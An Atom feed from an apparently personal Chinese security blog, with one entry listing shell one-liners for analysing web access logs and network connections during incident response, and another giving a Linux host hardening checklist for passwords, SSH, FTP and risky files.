<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>TBOsec的网络日志</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2021-04-17T06:54:00.627Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>TBOsec</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>web入侵日志分析命令</title>
    <link href="http://yoursite.com/2021/access%E6%97%A5%E5%BF%97.html"/>
    <id>http://yoursite.com/2021/access%E6%97%A5%E5%BF%97.html</id>
    <published>2021-04-17T06:52:05.000Z</published>
    <updated>2021-04-17T06:54:00.627Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>在应急响应或者入侵排查中常常会涉及服务器日志分析，在web日志中可以获取很多关键信息，如访问量最多的IP、访问次数最多的页面等等，于是收集，整理一些服务器日志分析命令</p></blockquote><p><strong>1、查看有多少个IP访问：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ awk &#39;&#123;print $1&#125;&#39; log_file|sort|uniq|wc -l</span><br></pre></td></tr></table></figure><p><strong>2、查看某一个页面被访问的次数：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ grep &quot;&#x2F;index.php&quot; log_file | wc -l</span><br></pre></td></tr></table></figure><p><strong>3、查看每一个IP访问了多少个页面：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ awk &#39;&#123;++S[$1]&#125; END &#123;for (a in S) print a,S[a]&#125;&#39; log_file &gt; log.txt</span><br><span class="line">$ sort -n -t &#39; &#39; -k 2 log.txt 配合sort进一步排序</span><br></pre></td></tr></table></figure><p><strong>4、将每个IP访问的页面数进行从小到大排序：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ awk &#39;&#123;++S[$1]&#125; END &#123;for (a in S) print S[a],a&#125;&#39; log_file | sort -n</span><br></pre></td></tr></table></figure><p><strong>5、查看某一个IP访问了哪些页面：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ grep ^111.111.111.111 log_file| awk &#39;&#123;print $1,$7&#125;&#39;</span><br></pre></td></tr></table></figure><p><strong>6、去掉搜索引擎统计的页面：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ awk &#39;&#123;print $12,$1&#125;&#39; log_file | grep ^&quot;Mozilla | awk &#39;&#123;print $2&#125;&#39; |sort | uniq | wc -l</span><br></pre></td></tr></table></figure><p><strong>7、查看2020年4月17日02时这一个小时内有多少IP访问:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ awk &#39;&#123;print $4,$1&#125;&#39; log_file | grep 17&#x2F;Jan&#x2F;2020:02 | awk &#39;&#123;print $2&#125;&#39;| sort | uniq | wc -l</span><br></pre></td></tr></table></figure><p><strong>8、查看访问前十个ip地址</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ awk &#39;&#123;print $1&#125;&#39; |sort|uniq -c|sort -nr |head -10 access_log</span><br></pre></td></tr></table></figure><p><strong>uniq -c 相当于分组统计并把统计数放在最前面</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat access.log|awk &#39;&#123;print $1&#125;&#39;|sort|uniq -c|sort -nr|head -10</span><br><span class="line">$ cat access.log|awk &#39;&#123;counts[$(11)]+&#x3D;1&#125;; END &#123;for(url in counts) print counts[url], url&#125;</span><br></pre></td></tr></table></figure><p><strong>9、访问次数最多的10个文件或页面</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ cat log_file|awk &#39;&#123;print $11&#125;&#39;|sort|uniq -c|sort -nr | head -10</span><br><span class="line">$ cat log_file|awk &#39;&#123;print $11&#125;&#39;|sort|uniq -c|sort -nr|head -20</span><br><span class="line">$ awk &#39;&#123;print $1&#125;&#39; log_file |sort -n -r |uniq -c | sort -n -r | head -20</span><br></pre></td></tr></table></figure><p>访问量最大的前20个ip</p><p><strong>10、通过子域名访问次数，依据referer来计算，稍有不准</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat access.log | awk &#39;&#123;print $11&#125;&#39; | sed -e &#39; s&#x2F;http:&#x2F;&#x2F;&#x2F;&#x2F;&#39; -e &#39; s&#x2F;&#x2F;.*&#x2F;&#x2F;&#39; | sort | uniq -c | sort -rn | head -20</span><br></pre></td></tr></table></figure><p><strong>11、列出传输大小最大的几个文件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat access.log |awk &#39;($7~&#x2F;.php&#x2F;)&#123;print $10 &quot; &quot; $1 &quot; &quot; $4 &quot; &quot; $7&#125;&#39;|sort -nr|head -100</span><br></pre></td></tr></table></figure><p><strong>12、列出输出大于200000byte(约200kb)的页面以及对应页面发生次数</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat access.log |awk &#39;($10 &gt; 200000 &amp;&amp; $7~&#x2F;.php&#x2F;)&#123;print $7&#125;&#39;|sort -n|uniq -c|sort -nr|head -100</span><br></pre></td></tr></table></figure><p><strong>13、如果日志最后一列记录的是页面文件传输时间，则有列出到客户端最耗时的页面</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat access.log |awk &#39;($7~&#x2F;.php&#x2F;)&#123;print $NF &quot; &quot; $1 &quot; &quot; $4 &quot; &quot; $7&#125;&#39;|sort -nr|head -100</span><br></pre></td></tr></table></figure><p><strong>14、列出最最耗时的页面(超过60秒的)的以及对应页面发生次数</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat access.log |awk &#39;($NF &gt; 60 &amp;&amp; $7~&#x2F;.php&#x2F;)&#123;print $7&#125;&#39;|sort -n|uniq -c|sort -nr|head -100</span><br></pre></td></tr></table></figure><p><strong>15、列出传输时间超过 30 秒的文件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat access.log |awk &#39;($NF &gt; 30)&#123;print $7&#125;&#39;|sort -n|uniq -c|sort -nr|head -20</span><br></pre></td></tr></table></figure><p><strong>16、列出当前服务器每一进程运行的数量，倒序排列</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ps -ef | awk -F &#39; &#39; &#39;&#123;print $8 &quot; &quot; $9&#125;&#39; |sort | uniq -c |sort -nr |head -20</span><br></pre></td></tr></table></figure><p><strong>17、查看apache当前并发访问数</strong></p><p>对比httpd.conf中MaxClients的数字差距多少</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ netstat -an | grep ESTABLISHED | wc -l</span><br></pre></td></tr></table></figure><p><strong>18、可以使用如下参数查看数据</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ps -ef|grep httpd|wc -l</span><br><span class="line">1388</span><br></pre></td></tr></table></figure><p>统计httpd进程数，连个请求会启动一个进程，使用于Apache服务器。<br>表示Apache能够处理1388个并发请求，这个值Apache可根据负载情况自动调整</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ netstat -nat|grep -i &quot;80&quot;|wc -l</span><br><span class="line">4341</span><br></pre></td></tr></table></figure><p>netstat -an会打印系统当前网络链接状态，而grep -i “80”是用来提取与80端口有关的连接的，wc -l进行连接数统计。<br>最终返回的数字就是当前所有80端口的请求总数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ netstat -na|grep ESTABLISHED|wc -l</span><br><span class="line">376</span><br></pre></td></tr></table></figure><p>netstat -an会打印系统当前网络链接状态，而grep ESTABLISHED 提取出已建立连接的信息。然后wc -l统计最终返回的数字就是当前所有80端口的已建立连接的总数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ netstat -nat||grep ESTABLISHED|wc</span><br></pre></td></tr></table></figure><p>可查看所有建立连接的详细记录</p><p><strong>19、输出每个ip的连接数，以及总的各个状态的连接数</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ netstat -n | awk &#39;&#x2F;^tcp&#x2F; &#123;n&#x3D;split($(NF-1),array,&quot;:&quot;);if(n&lt;&#x3D;2)++S[array[(1)]];else++S[array[(4)]];++s[$NF];++N&#125; END &#123;for(a in S)&#123;printf(&quot;%-20s %s&quot;, a, S[a]);++I&#125;printf(&quot;%-20s %s&quot;,&quot;TOTAL_IP&quot;,I);for(a in s) printf(&quot;%-20s %s&quot;,a, s[a]);printf(&quot;%-20s %s&quot;,&quot;TOTAL_LINK&quot;,N);&#125;&#39;</span><br></pre></td></tr></table></figure><p><strong>20、其他的收集</strong></p><p>分析日志文件下 2012-05-04 访问页面最高 的前20个 URL 并排序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat access.log |grep &#39;17&#x2F;Apr&#x2F;2021&#39;| awk &#39;&#123;print $11&#125;&#39;|sort|uniq -c|sort -nr|head -20</span><br></pre></td></tr></table></figure><p>查询受访问页面的URL地址中 含有 <a href="http://www.abc.com" target="_blank" rel="noopener">www.abc.com</a> 网址的 IP 地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat access_log | awk &#39;($11~&#x2F;www.abc.com&#x2F;)&#123;print $1&#125;&#39;|sort|uniq -c|sort -nr</span><br></pre></td></tr></table></figure><p>获取访问最高的10个IP地址 同时也可以按时间来查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat linewow-access.log|awk &#39;&#123;print $1&#125;&#39;|sort|uniq -c|sort -nr|head -10</span><br></pre></td></tr></table></figure><p>时间段查询日志时间段的情况</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat log_file | egrep &#39;15&#x2F;Apr&#x2F;2021|17&#x2F;Apr&#x2F;2021&#39; |awk &#39;&#123;print $1&#125;&#39;|sort|uniq -c|sort -nr|head -10</span><br></pre></td></tr></table></figure><p>分析2021/4/15 到 2021/4/17 访问”/index.php?g=Member&amp;m=Public&amp;a=sendValidCode”的IP倒序排列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat log_file | egrep &#39;15&#x2F;Apr&#x2F;2021|17&#x2F;Apr&#x2F;2021&#39; | awk &#39;&#123;if($7 &#x3D;&#x3D; &quot;&#x2F;index.php?g&#x3D;Member&amp;m&#x3D;Public&amp;a&#x3D;sendValidCode&quot;) print $1,$7&#125;&#39;|sort|uniq -c|sort -nr</span><br></pre></td></tr></table></figure><p>($7~/.php/) $7里面包含.php的就输出,本句的意思是最耗时的一百个PHP页面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat log_file |awk &#39;($7~&#x2F;.php&#x2F;)&#123;print $NF &quot; &quot; $1 &quot; &quot; $4 &quot; &quot; $7&#125;&#39;|sort -nr|head -100</span><br></pre></td></tr></table></figure><p>列出最最耗时的页面(超过60秒的)的以及对应页面发生次数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat access.log |awk &#39;($NF &gt; 60 &amp;&amp; $7~&#x2F;.php&#x2F;)&#123;print $7&#125;&#39;|sort -n|uniq -c|sort -nr|head -100</span><br></pre></td></tr></table></figure><p>统计网站流量（G)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat access.log |awk &#39;&#123;sum+&#x3D;$10&#125; END &#123;print sum&#x2F;1024&#x2F;1024&#x2F;1024&#125;&#39;</span><br></pre></td></tr></table></figure><p>统计404的连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ awk &#39;($9 ~&#x2F;404&#x2F;)&#39; access.log | awk &#39;&#123;print $9,$7&#125;&#39; | sort</span><br></pre></td></tr></table></figure><p>统计http status</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat access.log |awk &#39;&#123;counts[$(9)]+&#x3D;1&#125;; END &#123;for(code in counts) print code, counts[code]&#125;&#39; </span><br><span class="line">$ cat access.log |awk &#39;&#123;print $9&#125;&#39;|sort|uniq -c|sort -rn</span><br></pre></td></tr></table></figure><p>每秒并发</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ watch &quot;awk &#39;&#123;if($9~&#x2F;200|30|404&#x2F;)COUNT[$4]++&#125;END&#123;for( a in COUNT) print a,COUNT[a]&#125;&#39; log_file|sort -k 2 -nr|head -n10&quot;</span><br></pre></td></tr></table></figure><p>带宽统计</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat apache.log |awk &#39;&#123;if($7~&#x2F;GET&#x2F;) count++&#125;END&#123;print &quot;client_request&#x3D;&quot;count&#125;&#39; </span><br><span class="line">$ cat apache.log |awk &#39;&#123;BYTE+&#x3D;$11&#125;END&#123;print &quot;client_kbyte_out&#x3D;&quot;BYTE&#x2F;1024&quot;KB&quot;&#125;&#39;</span><br></pre></td></tr></table></figure><p>找出某天访问次数最多的10个IP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat access.log | grep &quot;15&#x2F;Apr&#x2F;2021&quot; |awk &#39;&#123;print $3&#125;&#39;|sort |uniq -c|sort -nr|head</span><br></pre></td></tr></table></figure><p>当天ip连接数最高的ip都在干些什么</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat access.log | grep &quot;10.0.21.17&quot; | awk &#39;&#123;print $8&#125;&#39; | sort | uniq -c | sort -nr | head -n 10</span><br></pre></td></tr></table></figure><p>小时单位里ip连接数最多的10个时段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ awk -vFS&#x3D;&quot;[:]&quot; &#39;&#123;gsub(&quot;-.*&quot;,&quot;&quot;,$1);num[$2&quot; &quot;$1]++&#125;END&#123;for(i in num)print i,num[i]&#125;&#39; log_file | sort -n -k 3 -r | head -10</span><br></pre></td></tr></table></figure><p>找出访问次数最多的几个分钟</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ awk &#39;&#123;print $1&#125;&#39; access.log | grep &quot;20&#x2F;Mar&#x2F;2011&quot; |cut -c 14-18|sort|uniq -c|sort -nr|head</span><br></pre></td></tr></table></figure><p>取5分钟日志</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ if [ $DATE_MINUTE !&#x3D; $DATE_END_MINUTE ] ;then #则判断开始时间戳与结束时间戳是否相等</span><br><span class="line">START_LINE&#x3D;sed -n &quot;&#x2F;$DATE_MINUTE&#x2F;&#x3D;&quot; $APACHE_LOG|head -n1 #如果不相等，则取出开始时间戳的行号，与结束时间戳的行号</span><br></pre></td></tr></table></figure><p>查看tcp的链接状态</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ netstat -nat |awk &#39;&#123;print $6&#125;&#39;|sort|uniq -c|sort -rn </span><br><span class="line">$ netstat -n | awk &#39;&#x2F;^tcp&#x2F; &#123;++S[$NF]&#125;;END &#123;for(a in S) print a, S[a]&#125;&#39; </span><br><span class="line">$ netstat -n | awk &#39;&#x2F;^tcp&#x2F; &#123;++state[$NF]&#125;; END &#123;for(key in state) print key,&quot;&quot;,state[key]&#125;&#39; </span><br><span class="line">$ netstat -n | awk &#39;&#x2F;^tcp&#x2F; &#123;++arr[$NF]&#125;;END &#123;for(k in arr) print k,&quot;&quot;,arr[k]&#125;&#39; </span><br><span class="line">$ netstat -n |awk &#39;&#x2F;^tcp&#x2F; &#123;print $NF&#125;&#39;|sort|uniq -c|sort -rn </span><br><span class="line">$ netstat -ant | awk &#39;&#123;print $NF&#125;&#39; | grep -v &#39;[a-z]&#39; | sort | uniq -c</span><br><span class="line">$ netstat -ant|awk &#39;&#x2F;ip:80&#x2F;&#123;split($5,ip,&quot;:&quot;);++S[ip[1]]&#125;END&#123;for (a in S) print S[a],a&#125;&#39; |sort -n </span><br><span class="line">$ netstat -ant|awk &#39;&#x2F;:80&#x2F;&#123;split($5,ip,&quot;:&quot;);++S[ip[1]]&#125;END&#123;for (a in S) print S[a],a&#125;&#39; |sort -rn|head -n 10 </span><br><span class="line">$ awk &#39;BEGIN&#123;printf (&quot;http_codecount_num&quot;)&#125;&#123;COUNT[$10]++&#125;END&#123;for (a in COUNT) printf a&quot;&quot;COUNT[a]&quot;&quot;&#125;&#39;</span><br></pre></td></tr></table></figure><p>查找请求数前20个IP（常用于查找攻来源）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ netstat -anlp|grep 80|grep tcp|awk &#39;&#123;print $5&#125;&#39;|awk -F: &#39;&#123;print $1&#125;&#39;|sort|uniq -c|sort -nr|head -n20 </span><br><span class="line">$ netstat -ant |awk &#39;&#x2F;:80&#x2F;&#123;split($5,ip,&quot;:&quot;);++A[ip[1]]&#125;END&#123;for(i in A) print A[i],i&#125;&#39; |sort -rn|head -n20</span><br></pre></td></tr></table></figure><p>用tcpdump嗅探80端口的访问看看谁最高</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tcpdump -i eth0 -tnn dst port 80 -c 1000 | awk -F&quot;.&quot; &#39;&#123;print $1&quot;.&quot;$2&quot;.&quot;$3&quot;.&quot;$4&#125;&#39; | sort | uniq -c | sort -nr |head -20</span><br></pre></td></tr></table></figure><p>查找较多time_wait连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ netstat -n|grep TIME_WAIT|awk &#39;&#123;print $5&#125;&#39;|sort|uniq -c|sort -rn|head -n20</span><br></pre></td></tr></table></figure><p>找查较多的SYN连接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ netstat -an | grep SYN | awk &#39;&#123;print $5&#125;&#39; | awk -F: &#39;&#123;print $1&#125;&#39; | sort | uniq -c | sort -nr | more</span><br></pre></td></tr></table></figure><p>根据端口列进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ netstat -ntlp | grep 80 | awk &#39;&#123;print $7&#125;&#39; | cut -d&#x2F; -f1</span><br></pre></td></tr></table></figure><p>查看了连接数和当前的连接数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ netstat -ant | grep $ip:80 | wc -l </span><br><span class="line">$ netstat -ant | grep $ip:80 | grep EST | wc -l</span><br></pre></td></tr></table></figure><p>查看IP访问次数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ netstat -nat|grep &quot;:80&quot;|awk &#39;&#123;print $5&#125;&#39; |awk -F: &#39;&#123;print $1&#125;&#39; | sort| uniq -c|sort -n</span><br></pre></td></tr></table></figure><p>Linux命令分析当前的链接状况</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$netstat -n | awk &#39;&#x2F;^tcp&#x2F; &#123;++S[$NF]&#125; END &#123;for(a in S) print a, S[a]&#125;&#39;</span><br><span class="line">$watch &quot;netstat -n | awk &#39;&#x2F;^tcp&#x2F; &#123;++S[$NF]&#125; END &#123;for(a in S) print a, S[a]&#125;&#39;&quot; # 通过watch可以一直监控</span><br><span class="line">$LAST_ACK 5 #关闭一个TCP连接需要从两个方向上分别进行关闭，双方都是通过发送FIN来表示单方向数据的关闭，当通信双方发送了最后一个FIN的时候，发送方此时处于LAST_ACK状态，当发送方收到对方的确认（Fin的Ack确认）后才真正关闭整个TCP连接；</span><br><span class="line"></span><br><span class="line">$SYN_RECV 30  # 表示正在等待处理的请求数；</span><br><span class="line"></span><br><span class="line">$ESTABLISHED 1597 # 表示正常数据传输状态； </span><br><span class="line"></span><br><span class="line">$FIN_WAIT1 51 # 表示server端主动要求关闭tcp连接； </span><br><span class="line"></span><br><span class="line">$FIN_WAIT2 504 # 表示客户端中断连接； </span><br><span class="line"></span><br><span class="line">$TIME_WAIT 1057  # 表示处理完毕，等待超时结束的请求数；</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;在应急响应或者入侵排查中常常会涉及服务器日志分析，在web日志中可以获取很多关键信息，如访问量最多的IP、访问次数最多的页面等等，于是收集，整理一些服务器日志分析命令&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;1、查看有多少个IP访
      
    
    </summary>
    
    
      <category term="Penetration" scheme="http://yoursite.com/categories/Penetration/"/>
    
    
      <category term="Linux" scheme="http://yoursite.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Linux主机安全配置规范</title>
    <link href="http://yoursite.com/2021/Linux%E5%9F%BA%E7%BA%BF.html"/>
    <id>http://yoursite.com/2021/Linux%E5%9F%BA%E7%BA%BF.html</id>
    <published>2021-04-14T05:51:33.000Z</published>
    <updated>2021-04-14T06:22:47.761Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、账号口令"><a href="#一、账号口令" class="headerlink" title="一、账号口令"></a>一、账号口令</h2><p><strong>1 配置口令最小长度</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在文件/etc/login.defs中设置 PASS_MIN_LEN，参考值：8</span><br></pre></td></tr></table></figure><p><strong>2 配置口令生存周期</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在文件/etc/login.defs中设置 PASS_MAX_DAYS，参考值：90</span><br></pre></td></tr></table></figure><p><strong>3 配置密码复杂度策略</strong></p><p>  CentOS系统：修改/etc/pam.d/system-auth文件, 在ucredit=-1 lcredit=-1 dcredit=-1 ocredit=-1 选3种，追加到password requisite pam_cracklib.so后面，添加到配置文件中。<a id="more"></a><br>例如：password requisite pam_cracklib.so ucredit=-1 lcredit=-1 dcredit=-1<br>注：ucredit：大写字母个数；lcredit：小写字母个数；dcredit：数字个数；ocredit：特殊字符个数</p><p><strong>4 限定用户su到root</strong></p><p>  编辑su文件(vi /etc/pam.d/su)，在开头添加下面两行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auth sufficient pam_rootok.so</span><br><span class="line">auth required pam_wheel.so group&#x3D;wheel</span><br></pre></td></tr></table></figure><p>这表明只有wheel组的成员可以使用su命令成为root用户。</p><h2 id="二、认证授权"><a href="#二、认证授权" class="headerlink" title="二、认证授权"></a>二、认证授权</h2><p><strong>1 设置文件与目录缺省权限</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在文件&#x2F;etc&#x2F;profile中设置umask 默认：022，可改为027</span><br></pre></td></tr></table></figure><p><strong>2 设置命令行界面超时退出</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">编辑&#x2F;etc&#x2F;profile,增加 export TMOUT&#x3D;300(单位：秒），重新登录时生效</span><br></pre></td></tr></table></figure><p><strong>3 禁止root用户远程ssh登录</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">修改&#x2F;etc&#x2F;ssh&#x2F;sshd_config文件,配置PermitRootLogin no 重启sshd服务生效</span><br></pre></td></tr></table></figure><p><strong>4 启用syslog日志审计</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">编辑&#x2F;etc&#x2F;rsyslog.conf, 配置: authpriv.* &#x2F;var&#x2F;log&#x2F;secure 并手动创建该文件，重启rsyslog生效</span><br></pre></td></tr></table></figure><h2 id="三、协议安全"><a href="#三、协议安全" class="headerlink" title="三、协议安全"></a>三、协议安全</h2><p><strong>1 禁止FTP匿名用户登录</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">编辑&#x2F;etc&#x2F;vsftpd.conf(或&#x2F;etc&#x2F;vsftpd&#x2F;vsftpd.conf)文件，设置：anonymous_enable&#x3D;NO</span><br></pre></td></tr></table></figure><p><strong>2 禁止root登录VSFTP</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">编辑&#x2F;etc&#x2F;ftpusers(或&#x2F;etc&#x2F;vsftpd&#x2F;ftpusers)文件，添加root</span><br></pre></td></tr></table></figure><p><strong>3 SSH配置非22端口，禁用telnet协议</strong></p><h2 id="四、其他"><a href="#四、其他" class="headerlink" title="四、其他"></a>四、其他</h2><p><strong>1 删除.netrc 文件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查找，find &#x2F; -maxdepth 3 -name .netrc 2&gt;&#x2F;dev&#x2F;null，重命名或者删除</span><br></pre></td></tr></table></figure><p><strong>2 删除hosts.equiv文件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -maxdepth 3 -name hosts.equiv 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><p><strong>3 删除.rhosts 文件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -maxdepth 3 -name .rhosts 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><p><strong>4 关闭不必要的服务和端口</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chkconfig --list</span><br><span class="line">chkconfig [--level levels] 服务名 off</span><br></pre></td></tr></table></figure><p><strong>5 删除系统banner信息，避免泄漏操作系统泄漏</strong></p><p>删除或重命名”/etc”目录下的 issue.net 和 issue 文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mv &#x2F;etc&#x2F;issue &#x2F;etc&#x2F;issue.bak</span><br><span class="line">mv &#x2F;etc&#x2F;issue.net &#x2F;etc&#x2F;issue.net.bak</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;一、账号口令&quot;&gt;&lt;a href=&quot;#一、账号口令&quot; class=&quot;headerlink&quot; title=&quot;一、账号口令&quot;&gt;&lt;/a&gt;一、账号口令&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;1 配置口令最小长度&lt;/strong&gt;&lt;/p&gt;
